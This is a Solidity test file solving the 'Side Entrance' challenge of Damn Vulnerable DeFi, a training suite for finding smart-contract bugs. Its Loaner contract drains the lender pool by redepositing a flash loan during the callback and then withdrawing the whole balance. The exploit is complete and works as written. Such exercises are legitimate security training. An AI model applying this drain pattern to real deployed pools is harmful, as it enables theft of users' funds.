// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Loaner {
    address vault;

    constructor(address _vault) payable {
        // to represent the pool :)
        vault = _vault;
    }

    function kill(uint256 amount, address recovery) public {
        // first off taking the flashloan for all the ether balance
        SideEntranceLenderPool(vault).flashLoan(amount);

        // confirming the balance
        console.log("loaners balance", SideEntranceLenderPool(vault).balances(address(this)));
        // withdraw all eth
        SideEntranceLenderPool(vault).withdraw();
        // send to recovery address
        address(recovery).call{value: address(this).balance}("");
    }

    function execute() external payable {
        // on the flashloan callback, deposit into the loaners balance. so the post flashloa check clears
        // but its now owned by the loaner that can withdraw anytime
        SideEntranceLenderPool(vault).deposit{value: address(this).balance}();
    }

    receive() external payable {}
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;
    Loaner loaner;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // it had to be a seperate contract since it needed to implement the `execute` function 
        loaner = new Loaner(address(pool));
        // pass in amount and recovery address
        loaner.kill(ETHER_IN_POOL, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
